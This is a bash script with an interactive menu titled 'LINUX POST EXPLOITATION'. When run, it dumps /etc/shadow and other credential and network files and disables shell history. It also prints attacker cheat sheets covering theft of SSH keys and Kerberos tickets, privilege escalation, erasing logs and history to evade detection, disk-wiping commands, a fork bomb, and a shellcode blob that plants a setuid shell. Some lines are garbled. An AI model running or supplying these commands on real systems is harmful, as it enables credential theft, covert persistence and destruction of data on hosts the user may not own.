#!/bin/bash
clear
#variables for colors
bold=`echo -en "\e[1m"`
underline=`echo -en "\e[4m"`
dim=`echo -en "\e[2m"`
strickthrough=`echo -en "\e[9m"`
blink=`echo -en "\e[5m"`
reverse=`echo -en "\e[7m"`
hidden=`echo -en "\e[8m"`
normal=`echo -en "\e[0m"`
black=`echo -en "\e[30m"`
red=`echo -en "\e[31m"`
green=`echo -en "\e[32m"`
orange=`echo -en "\e[33m"`
blue=`echo -en "\e[34m"`
purple=`echo -en "\e[35m"`
aqua=`echo -en "\e[36m"`
gray=`echo -en "\e[37m"`
darkgray=`echo -en "\e[90m"`
lightred=`echo -en "\e[91m"`
lightgreen=`echo -en "\e[92m"`
lightyellow=`echo -en "\e[93m"`
lightblue=`echo -en "\e[94m"`
lightpurple=`echo -en "\e[95m"`
lightaqua=`echo -en "\e[96m"`
white=`echo -en "\e[97m"`
default=`echo -en "\e[39m"`
BLACK=`echo -en "\e[40m"`
RED=`echo -en "\e[41m"`
GREEN=`echo -en "\e[42m"`
ORANGE=`echo -en "\e[43m"`
BLUE=`echo -en "\e[44m"`
PURPLE=`echo -en "\e[45m"`
AQUA=`echo -en "\e[46m"`
GRAY=`echo -en "\e[47m"`
DARKGRAY=`echo -en "\e[100m"`
LIGHTRED=`echo -en "\e[101m"`
LIGHTGREEN=`echo -en "\e[102m"`
LIGHTYELLOW=`echo -en "\e[103m"`
LIGHTBLUE=`echo -en "\e[104m"`
LIGHTPURPLE=`echo -en "\e[105m"`
LIGHTAQUA=`echo -en "\e[106m"`
WHITE=`echo -en "\e[107m"`
DEFAULT=`echo -en "\e[49m"`;


echo "                            ${red}LINUX POST EXPLOITATION"
echo "$normal"

options="Blindfiles System Networking UserAccounts CoveringTracks AdditionalCommands Quit"

select option in $options
do

     case $option in 
          "Blindfiles")
                 echo "you have selected blindfiles"
                 function bs(){
					echo "$red
			                 -------------------------------------
					|  executing 'cat /etc/passwd'        |
					|                                     |
					 -------------------------------------
					"
					echo "$normal"
					 cat /etc/passwd
echo "				${red}	 
					 -------------------------------------
					|   executing 'cat /etc/shadow'       |
					|                                     |
					 -------------------------------------
					 "
					 echo "$normal"
                     cat /etc/shadow
                     
				 }
bs		   
		         ;;
		  "System")
		         echo "you have selected system"
		         
		         function sys(){       
					echo " ${red}
					 -------------------------------------
					|      executing 'uname -a'           |    
					|                                     |
					 -------------------------------------
					" 
					echo "$normal"
					 uname -a	
					 echo "${red}
					 -------------------------------------
					|      executing 'id'                 |    
					|                                     |
					 -------------------------------------
					"			
					echo "$normal"	 
                     id
                     echo "${red}
					 -------------------------------------
					|      executing 'locate /bin/nc'     |   
					|                                     |
					 -------------------------------------
					"
					echo "$normal"
                     locate /bin/nc
                     
				 }
sys
				 ;;
		  "Networking")
		         echo "you have selected networking"
		         function nt(){
					 echo "$red
					 -------------------------------------
					|      executing 'hostname -f'        |
					|                                     |
					 -------------------------------------
					"
					echo "$normal"
					hostname -f
					echo "$red
					 -------------------------------------
					|        executing 'route -n'         |
					|                                     |
					 -------------------------------------
					"
					echo "normal"
                     route -n
                     echo "$red
					 --------------------------------------------
					|  executing 'cat /etc/network/interfaces'   |
					|                                            |
					 --------------------------------------------
					"
					echo "$normal"
                     cat /etc/network/interfaces
                     echo "$red
					 -------------------------------------
					|        executing 'netstat -r '      |
					|                                     |
					 -------------------------------------
					"
					echo "$normal"
                     netstat -r
                     echo "$red
					 -------------------------------------
					|     executing 'netstat -anop'       |
					|                                     |
					 -------------------------------------
					"
					echo "$normal"
                     netstat -anop
                     echo "$red
					 -------------------------------------
					|         executing 'arp -a'          |
					|                                     |
					 -------------------------------------
					"
					echo "$normal"
                     arp -a
                     #cat /proc/net/* 	#more discreet, all the information given by the above commands can be found by looking into the files under /proc/net, and this approach is less likely to trigger monitoring or other stuff
#activate the above command if you want by removing the "#' sign before cat
				 
				 }
nt	
				 ;;
		  "UserAccounts")
		         echo "you have selected useraccounts"
		         function ua(){
					 echo "$red
					 ------------------------------------------
					|  executing 'cat /etc/security/opasswd'   |
					|                                          |
					 ------------------------------------------
					"
					echo "$normal"
					  cat /etc/security/opasswd
					 echo "$red
					 ---------------------------------------
					|     executing 'cat /etc/group'        |
					|                                       |
					 ---------------------------------------
					"
					echo "$normal"
                     cat /etc/group
                     echo "$red
					 -----------------------------------
					|    executing 'getent passwd'      |
					|                                   |
					 -----------------------------------
					"echo "$normal"
                     getent passwd
               
                 }
ua
                ;;
          "CoveringTracks")
          
                echo "you have selected covering tracks"
                echo "please see some info about this issue in the additional commands under covering tracks section"
                echo "executing 'export HISTFILE=' cmd ......"
                function ct(){
					export HISTFILE=
				}
ct				
          ;;
          "AdditionalCommands")     
                echo "it's good to consider this additional commands"
                function ac(){
					opt="ObtainUser's-Info Credentials Finding-ImportantFiles Escalating Configs Covering-Tracks"
				select option in $opt
do
				
				case $option in
			"ObtainUser's-Info")
echo "
       Obtain user's information

    ls -alh /home/*/
    ls -alh /home/*/.ssh/
    cat /home/*/.ssh/authorized_keys
    cat /home/*/.ssh/known_hosts
    cat /home/*/.hist # you can learn a lot from this
    find /home/*/.vnc /home/*/.subversion -type f
    grep ^ssh /home/*/.hist
    grep ^telnet /home/*/.hist
    grep ^mysql /home/*/.hist
    cat /home/*/.viminfo
    sudo -l # if sudoers is not. readable, this sometimes works per user
    crontab -l
    cat /home/*/.mysql_history"
#sudo -p (allows the user to define what the password prompt will be, useful for fun customization with aliases or shell scripts)
 ;;

               "Credentials") 
echo "
          Credentials
         
File/Folder                    Description and/or Reason
------------ 	               -------------------------
/home/*/.ssh/id* 	            SSH keys, often passwordless
/tmp/krb5cc_* 	                    Kerberos tickets
/tmp/krb5.keytab 	            Kerberos tickets
/home/*/.gnupg/secring.gpgs 	    PGP keys
"
;;
           "Finding-ImportantFiles")
echo "
       Finding Important Files"

echo "ls -dlR */
      ls -alR | grep ^d
      find /var -type d "
    #ls -dl `find /var -type d`
    #ls -dl `find /var -type d` | grep -v root
echo "     find /var ! -user root -type d -ls
      find /var/log -type f -exec ls -la {} ;
      find / -perm -4000 (find all suid files)
      ls -alhtr /mnt
      ls -alhtr /media
      ls -alhtr /tmp
      ls -alhtr /home
      cd /home/
treels /home//.ssh/
      find /home -type f -iname '.*history'
      ls -lart /etc/rc.d/
      locate tar | grep [.]tar$ # Remember to updatedb before running locate
      locate tgz | grep [.]tgz$
      locate sql | grep [.]sql$
      locate settings | grep [.]php$
      locate config.inc | grep [.]php$
      ls /home/*/id*
      .properties | grep [.]properties # java config files
      locate .xml | grep [.]xml # java/.net config files
      find /sbin /usr/sbin /opt /lib `echo $PATH | ‘sed s/:/ /g’` -perm /6000 -ls # find suids
      locate rhosts

Also, check http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf for some one-liners that find world writable    directories/files and more."

;;
           "Escalating")
echo "
                  Escalating

Looking for possible opened paths

    ls -alh /root/
    sudo -l
    cat /etc/sudoers
    cat /etc/shadow
    cat /etc/master.passwd # OpenBSD
    cat /var/spool/cron/crontabs/* | cat /var/spool/cron/*
    lsof -nPi
    ls /home/*/.ssh/* "
 
 ;;
           "Configs") 
echo "
              
              Configs

   - ls -aRl /etc/ * awk '$1 ~ /w.$/' * grep -v lrwx 2>/dev/nullte
   - cat /etc/issue{,.net}
   - cat /etc/master.passwd
   - cat /etc/group
   - cat /etc/hosts
   - cat /etc/crontab
   - cat /etc/sysctl.conf"
    #for user in $(cut -f1 -d: /etc/passwd)do echo $usercrontab -u $user -l done # (Lists all crons) 
echo "         - cat /etc/resolv.conf
         - cat /etc/syslog.conf
         - cat /etc/chttp.conf
         - cat /etc/lighttpd.conf
         - cat /etc/cups/cupsd.confcda
         - cat /etc/inetd.conf
         - cat /opt/lampp/etc/httpd.conf
         - cat /etc/samba/smb.conf
         - cat /etc/openldap/ldap.conf
         - cat /etc/ldap/ldap.conf
         - cat /etc/exports
         - cat /etc/auto.master
         - cat /etc/auto_master
         - cat /etc/fstab
         - find /etc/sysconfig/ -type f -exec cat {} ;
"
;;
              "Covering-Tracks")
echo "  
                      Covering Tracks

 this commands are used if you happen to be on an account that was originally inaccessible, if the .bash_history file is available (ls -a ~), viewcating its contents can provide you with a good deal of information about the system and its most recent updates/changes.
clear all history in ram"
echo "   
    history -c
    rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)
    touch ~/.bash_history (invasive)
    history -c (using a space before a command)
    zsh% unset HISTFILE HISTSIZE
    tcsh% set history=0
    bash$ set +o history
    ksh$ unset HISTFILE
    find / -type f -exec {} (forensics nightmare)"
    
echo "
Note that you’re probably better off modifying or temporary disabling rather than deleting history files, it leaves a lot less traces and is less suspect.

In some cases HISTFILE and HISTFILESIZE are made read-only
get around this by explicitly clearing history (history -c) or by kill -9 $$’ing the shell. Sometimes the shell can be configured to run ‘history -w’ after every command
get around this by overriding ‘history’ with a no-op shell function. None of this will help if the shell is configured to log everything to syslog, however."

echo " 
                     Deleting and Destroying

If it is necessary to leave the machine inaccessible or unusable. Note that this tends to be quite evident (as opposed to a simple exploitation that might go unnoticed for some time, even forever), and will most surely get you into troubles.
Oh, and you’re probably a jerk if you use any of the stuff below.
 
File 	Description and/or Reason
|----------------------------------------------------------------------------------------------------|
|rm -rf /                           |	This will recursively try to delete all files                |             
|mkfs.ext3 /dev/sda                 |	Reformat the device mentioned, making recovery of files hard |
|dd if=/dev/zero of=/dev/sda bs=1M  |	Overwrite disk /dev/sda with zeros                           |
|----------------------------------------------------------------------------------------------------|
    Hex version of rm -rf / (How is this supposed to work?)
    
    char esp[] __attribute__ ((section(”.text”))) /* e.s.p release */ = '\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68'
    '\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99
    \xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7
    \x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56
    \x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31
    \xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69
    \x6e\x2f\x73\x68\x00\x2d\x63\x00'
    cp -p /bin/sh /tmp/.beyond
chmod 4755 /tmp/.beyond;';

    Fork Bomb: The [in]famous 'fork bomb'. This command will cause your system to run a large number of processes, until it 'hangs'. This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.

    :(){:|:&};: "
    break
    ;;
    *) echo "invalid option selected";;
                esac
         done
	 }
ac  
     ;;
	  "Quit")
                exit            
              ;;
            *) echo "invalid option selected";;
     esac           
                 
done
					 
					 
					 
					 
					 		 
